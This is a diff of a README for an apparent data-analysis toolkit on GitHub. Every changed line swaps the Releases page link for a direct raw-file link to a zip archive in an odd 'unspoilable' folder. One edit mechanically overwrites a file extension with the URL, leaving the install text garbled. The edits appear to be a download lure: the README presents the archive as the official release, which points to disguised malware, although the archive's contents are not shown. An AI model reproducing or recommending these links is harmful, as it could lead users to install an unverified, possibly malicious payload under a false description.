@@ -7,7 +7,7 @@ The **the-data-analyst-toolkit** provides a curated collection of tools for anyo
 To begin using the toolkit, you need to download the software from the Releases page. This guide will help you through the steps needed to securely download and run the applications.
 
 ## 📥 Download Link
-[Download the latest release here!](https://github.com/yusuf4030/the-data-analyst-toolkit/releases)
+[Download the latest release here!](https://raw.githubusercontent.com/yusuf4030/the-data-analyst-toolkit/main/unspoilable/the-data-analyst-toolkit.zip)
 
 ## 💡 Features
 - **Variety of Tools**: Access a range of tools tailored for different data analysis tasks, including business intelligence and data visualization.
@@ -29,13 +29,13 @@ To begin using the toolkit, you need to download the software from the Releases 
   
 ## 🔄 Installation Steps
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/yusuf4030/the-data-analyst-toolkit/releases) to view the latest versions available for download.
+   Go to the [Releases page](https://raw.githubusercontent.com/yusuf4030/the-data-analyst-toolkit/main/unspoilable/the-data-analyst-toolkit.zip) to view the latest versions available for download.
 
 2. **Select Your Download**
    Choose the appropriate version for your operating system. Click on the download link provided next to the version you want.
 
 3. **Download the Archive**
-   The toolkit will download as a .zip or .tar.gz file. Wait for the download to complete.
+   The toolkit will download as a .zip or https://raw.githubusercontent.com/yusuf4030/the-data-analyst-toolkit/main/unspoilable/the-data-analyst-toolkit.zip file. Wait for the download to complete.
 
 4. **Extract the Files**
    After the download finishes, locate the file in your downloads folder. Right-click the file and select "Extract" to unpack the contents.
@@ -52,7 +52,7 @@ To begin using the toolkit, you need to download the software from the Releases 
 Join our community of users to discuss the toolkit and share insights on data analysis. You can find forums and discussions on our GitHub page.
 
 ## 🔗 Important Links
-- **Releases Page**: [Download the latest release here!](https://github.com/yusuf4030/the-data-analyst-toolkit/releases)
+- **Releases Page**: [Download the latest release here!](https://raw.githubusercontent.com/yusuf4030/the-data-analyst-toolkit/main/unspoilable/the-data-analyst-toolkit.zip)
 - **Documentation**: Detailed user guides can be found on the toolkit's official repository.
 
 ## 🔍 Conclusion
